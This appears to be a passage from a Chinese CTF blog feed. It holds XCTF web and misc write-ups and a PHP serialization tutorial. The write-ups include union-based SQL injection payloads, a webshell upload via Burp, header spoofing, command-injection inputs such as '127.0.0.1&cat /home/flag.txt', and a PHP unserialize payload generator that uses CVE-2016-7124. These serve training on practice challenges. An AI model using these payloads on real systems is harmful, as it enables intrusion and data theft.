src="simple_transfer1.png" alt="simple_transfer1"></p><p>然后打开文件夹：</p><p><img src="simple_transfer2.png" alt="simple_transfer2"></p><hr><h3 id="7-流量分析1"><a href="#7-流量分析1" class="headerlink" title="7.流量分析1"></a>7.流量分析1</h3><p>题目描述: </p><p>流量分析，你知道这堆流量做了什么事情吗，你能恢复出来flag吗？</p><p>文件名的challenge，很好，非常有挑战性：</p><p><img src="challenge1.png" alt="challenge1"></p><p>第四条流量一下就吸引住了我，追踪TCP流看一下：</p><p><img src="challenge2.png" alt="challenge2"></p><p>嗯？sql注入？</p><p>扔到burp里smart decode一下：</p><p><img src="challenge3.png" alt="challenge3"></p><p>bool盲注，这里直接过滤：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ip.<span class="hljs-attribute">addr</span>==192.168.43.109 &amp;&amp; ip.<span class="hljs-attribute">addr</span>==39.105.136.196 &amp;&amp;http.request.uri contains<span class="hljs-string">&quot;substr&quot;</span><br></code></pre></td></tr></table></figure><p>刚刚分析得到，如果if判断成功，那页面延迟三秒返回，这里我们应该关注一下时间，可以看到11秒到14秒刚好三秒，说明判断成功了，去看看</p><p><img src="challenge5.png" alt="challenge5"></p><p>ascii码是102，查表得知是’f’</p><p>看大佬wp得知，有一个过滤的命令可以过滤出延迟大于3秒的http数据包</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">frame.time_delta&gt;<span class="hljs-number">3</span><span class="hljs-meta">&amp;&amp;http</span><br></code></pre></td></tr></table></figure><p>那就方便多了，一个一个对照ascii码表就行了，这里最后一个字符是1，并不是}，不过前面已经有{了，这里我们手动加上就好了。</p><hr><h3 id="8-流量分析2"><a href="#8-流量分析2" class="headerlink" title="8.流量分析2"></a>8.流量分析2</h3><p>简单看了一下，好像没啥收获，去kali里试了一下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">binwalk <span class="hljs-keyword">test</span>.pcapng<br>strings <span class="hljs-keyword">test</span>.pcapng | grep<span class="hljs-string">&quot;flag&quot;</span><br></code></pre></td></tr></table></figure><p>都没奏效，仔细看一下：<br><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.1.png" alt="流量分析2.1"></p><p>txt应该是有价值的东西，而且看样子不止一个，过滤一下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;test.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.2.png" alt="流量分析2.2"></p><p>果然有好几个test.txt，按时间顺序打开看看：<br><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.3.png" alt="流量分析2.3"></p><p><img src="%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902.4.png" alt="流量分析2.4"></p><p>两个里面都有内容，把他们串起来就是flag了：<strong>flag{17uaji1l}</strong> </p><p>这里要注意一下，包里并没有ag的内容，要自己加上</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>序列化</title>
    <link href="/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/04/21/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在我看完<a href="https://m.php.cn/article/358919.html">这篇文章</a>后，我终于懂了一些关于序列化的知识：</p><p>serialize() 函数会检查类中是否存在魔术方法比如 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>先看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span>;   <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$sex</span>;    <br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$age</span>;    <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;&quot;</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;sex = <span class="hljs-variable">$sex</span>;        <br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br><br>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我的名字叫：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name . <span class="hljs-string">&quot; 性别：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;sex . <span class="hljs-string">&quot; 我的年龄是：&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;age . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125;    <span class="hljs-comment">//指定串行化时把返回的数组中$name和$age值串行化，忽略没在数组中的属性$sex</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br><br>        <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br><br>    &#125;    <span class="hljs-comment">//重新生成对象时，并重新赋值$age为40</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-number">40</span>;<br><br>    &#125;<br><br>&#125;<span class="hljs-variable">$p1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<span class="hljs-comment">//把一个对象串行化，返一个字符串，调用了sleep()方法,忽略没在数组中的属性</span><br><br><span class="hljs-variable">$p1_string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p1_string</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">//串行化的字符串我们通常不去解析</span><br><br><span class="hljs-variable">$p2</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p1_string</span>); <span class="hljs-comment">//反串行化形成对象$p2重新赋值</span><br><br><span class="hljs-comment">//此时$age为40</span><br><br><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.sleep()函数会在序列化时被调用，比如我现在有一个Person类，有name，sex和age三个变量，并且类中有 __sleep()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>); <span class="hljs-comment">// 此时，属性$sex将被删除！！！</span><br>       <span class="hljs-keyword">return</span>(<span class="hljs-variable">$arr</span>);<br> &#125;<br><span class="hljs-variable">$p1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p1</span>);<br></code></pre></td></tr></table></figure><p>会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Person&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;张三&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">20</span>;&#125;<br></code></pre></td></tr></table></figure><p>他们分别表示：<br>变量类型:类名长度:类名:属性数量：{属性类型:属性名长度:属性名；属性值类型:属性值长度:属性值内容}</p><p>O（object）表示对象，因为$p1是类Person的一个对象</p><p>这里我们可以看到，创建类对象时，是有“男”这一属性的，但由于调用了 __sleep()，这一属性消失了，并且序列化后的属性数量由3变为了2，而当我最后使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p2</span>-&gt;<span class="hljs-title function_ invoke__">say</span>();<br></code></pre></td></tr></table></figure><p>由于$p2是反序列化后的$p1，而反序列化时又会调用wakeup函数，它修改了age的值</p><p>故返回值为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">我的名字叫：张三 性别： 我的年龄是：<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>可以看到，性别这一变量为空并且age为40</p><p>当私有成员序列化时: \x00 + [私有成员所在类名] + \x00 [变量名]</p><p>总结一下调用顺序</p><div align="center">serialize()   -------> sleep()</div><div align="center">unserialize()    -------> wakeup()</div>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>难度2</title>
    <link href="/2023/04/05/web02/"/>
    <url>/2023/04/05/web02/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-NewsCenter"><a href="#1-NewsCenter" class="headerlink" title="1.NewsCenter"></a>1.NewsCenter</h3><p>sql注入</p><p>查库名，就一个news</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">hello&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,schema_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>查表名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">hello&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&quot;news&quot;</span> #<br></code></pre></td></tr></table></figure><p>得到news,secret_table</p><p>查secret_table</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">hello&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&quot;secret_table&quot;</span>#<br></code></pre></td></tr></table></figure><p>得到id,fl4g，查询fl4g：</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">hello&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,fl4g <span class="hljs-keyword">from</span> secret_table<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="newscenter.png" alt="newscenter"></p><hr><h3 id="2-upload1"><a href="#2-upload1" class="headerlink" title="2.upload1"></a>2.upload1</h3><p>直接上传shell.php</p><p><img src="upload11.png" alt="upload11"></p><p>果然没这么简单，上传现成的图片马4.jpg（难度1中用过）</p><p><img src="upload12.png" alt="upload12"></p><p>传了图片马之后，要想办法让它被解析，分布式配置文件依然被拦，想到难度1中用过.user.ini，再试一下</p><p>内容为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>当我想用burp改包的时候，我发现已经被拦了，再一细看，上传按钮不能点，我立刻想到难度1不能按的按钮，果不其然，直接删掉disabled&#x3D;””   </p><p>ps:写到这不得不说一句，难度顺序排的是真好，前面刚做过这里就用上了。</p><p><img src="upload13.png" alt="upload13"></p><p>依然是把内容类型改为image&#x2F;jpg，上传成功。</p><p><img src="upload14.png" alt="upload14"></p><p>但是名字被改了，.user.ini前面多了一串数字，显然失败了。<del>早该想到的</del></p><p><del>高端的食材往往采用最朴素的烹饪方式</del>，放大招：</p><p>直接上传4.jpg，burp改包，改成4.php，根据路径，蚁剑连接，getshell</p><p><img src="upload15.png" alt="upload15"></p><p>最后成功找到flag</p><p><img src="upload16.png" alt="upload16"></p><hr><h3 id="3-xff-referer"><a href="#3-xff-referer" class="headerlink" title="3.xff_referer"></a>3.xff_referer</h3><p>题目描述: X老师告诉小宁其实xff和referer是可以伪造的。</p><p>进入环境，页面有一句话：ip地址必须为123.123.123.123</p><h4 id="xff："><a href="#xff：" class="headerlink" title="xff："></a>xff：</h4><p>很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p><p>X-Forwarded-For的格式如下：</p><pre><code class="hljs">X-Forwarded-For: client1, proxy1, proxy2</code></pre><p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p><p>一般的客户端发送HTTP请求没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p><p>但是如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，获取的左边第一个IP地址将会是客户端伪造的IP。伪造X-Forwarded-For头只需加上X-Forwarded-For头就可以</p><h4 id="referer："><a href="#referer：" class="headerlink" title="referer："></a>referer：</h4><p>HTTP 请求的头信息里面，Referer 是一个常见字段，提供访问来源的信息。这个字段是可选的。客户端发送请求的时候，自主决定是否加上该字段。</p><p>以上摘自CSDN博主<a href="https://blog.csdn.net/weixin_45746283/article/details/127876705">「Arik0」的文章</a></p><p>了解到以上知识后，我们就知道该怎么做了，burp抓包，提交：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">123.123.123.123</span><br></code></pre></td></tr></table></figure><p>页面又提示必须来自<a href="https://www.google.com，该referer登场了：">https://www.google.com，该referer登场了：</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Referer：https:<span class="hljs-regexp">//</span>www.google.com<br></code></pre></td></tr></table></figure><p> <img src="xff_referer.png" alt="xff_referer"></p><p>注意，<strong>这里的xff和referer要在请求头中</strong></p><hr><h3 id="4-command-execution"><a href="#4-command-execution" class="headerlink" title="4.command_execution"></a>4.command_execution</h3><p>题目描述: 小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><p>先学习一下，Windows或Linux下命令执行漏洞要用到的</p><table><thead><tr><th align="left">分隔符</th><th align="left">用法</th><th>解释</th></tr></thead><tbody><tr><td align="left">;</td><td align="left">A;B</td><td>先执行A，在执行B</td></tr><tr><td align="left">&amp;</td><td align="left">A&amp;B</td><td>简单拼接，互不影响</td></tr><tr><td align="left">|</td><td align="left">A|B</td><td>显示B的执行结果</td></tr><tr><td align="left">&amp;&amp;</td><td align="left">A&amp;&amp;B</td><td>A执行成功才会执行B</td></tr><tr><td align="left">||</td><td align="left">A||B</td><td>A执行失败，然后才会执行B</td></tr></tbody></table><p>命令执行，想到命令行，dir行不通，就ls，可以得知是linux操作系统，这一点根据后门文件夹也能看出来</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls /<br></code></pre></td></tr></table></figure><p><img src="command_execution1.png" alt="command_execution1"></p><p>查找文件名中含有flag的文件</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;find / -name <span class="hljs-string">&quot;flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="command_execution2.png" alt="command_execution2"></p><p>找到flag.txt，打开，拿到flag。（Windows的查看文件内容命令是type）</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat /home/flag.txt<br></code></pre></td></tr></table></figure><hr><h3 id="5-web2"><a href="#5-web2" class="headerlink" title="5.web2"></a>5.web2</h3><p>又是学习php的一题，上菜：</p><p><img src="web21.png" alt="web21"></p><p>先时将flag字符串逆序，</p><p>然后每一个ascii码数值+1，</p><p>然后base64加密，</p><p>然后逆序，</p><p>然后再rot13加密</p><p>得到加密的密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p><p>写个php就行了，结果如图：</p><p><img src="web22.png" alt="web22"></p><p>ps：<strong>rot13加密和解密是同一个函数</strong></p><p>附<a href="https://c.runoob.com/compile/1/">php在线编码</a></p><hr><h3 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;     <span class="hljs-comment">//构造函数</span><br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;                  <span class="hljs-comment">//析构函数</span><br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;                   <span class="hljs-comment">//反序列化时将调用此函数</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);              <span class="hljs-comment">//base64解码</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>&#x2F;[oc]:\d+:&#x2F;i研究</strong>：</p><p>[OC]：匹配O或C</p><p>\d:  匹配一个数字字符。等价于 [0-9]。<br> +:  匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。<br>&#x2F;i:  表示匹配的时候不区分大小写。<br>preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头。</p><p>总的思路是，先base64编码一次，首先避开正则匹配，序列化后<strong>O:4</strong>刚好会被匹配，这里使用O:+4进行绕过。然后避开**_wakeup()<strong>函数，这里利用</strong>wakeup()的CVE-2016-7124**，当序列化字符串中的属性个数大于类中真实属性个数时，_wakeup()会跳过执行，以便读取fl4g.php。</p><p>这里还有一个点，类的私有成员序列化时会在类名和字段名上添加保护，格式为: \x00 + [私有成员所在类名] + \x00 [变量名]，前后均有空格</p><p>因此对于private属性在类名和字段名前均需要添加\0</p><p>当使用浏览器提交时需要在类名和字段名前添加%00  </p><p>本题是get传参，故加%00</p><p>php在线编译：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;  <span class="hljs-comment">//设置了类的私有变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <span class="hljs-comment">//实例化对象时将会被调用</span><br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//将对象的file属性的值设置为file变量</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//当对象被销毁时将会被调用</span><br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>);  <span class="hljs-comment">//输出读取到的文件</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-comment">//当进行反序列化操作时候  函数将会被调用</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php  //将对象的file参数设置为index.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<span class="hljs-comment">//实例化对象   __construct函数将会被自动调用  fl4g.php 将会被赋值给$file变量</span><br><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);   <span class="hljs-comment">//对a进行序列化操作</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$c</span>);  <span class="hljs-comment">//通过添加+号绕过正则的过滤</span><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$c</span>);   <span class="hljs-comment">//利用__wakeup()的CVE-2016-7124  在序列化的字符串当中当真实的属性个数大于真实的属性个数时  该函数不会执行</span><br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;%00&#x27;</span>,<span class="hljs-variable">$c</span>);   <span class="hljs-comment">//序列化私有类时  类名和字段名前会有空格  使用url传参时需要将空格替换成%00</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$j</span>=(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$c</span>));  <span class="hljs-comment">//对其进行base64编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$j</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Demo&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span 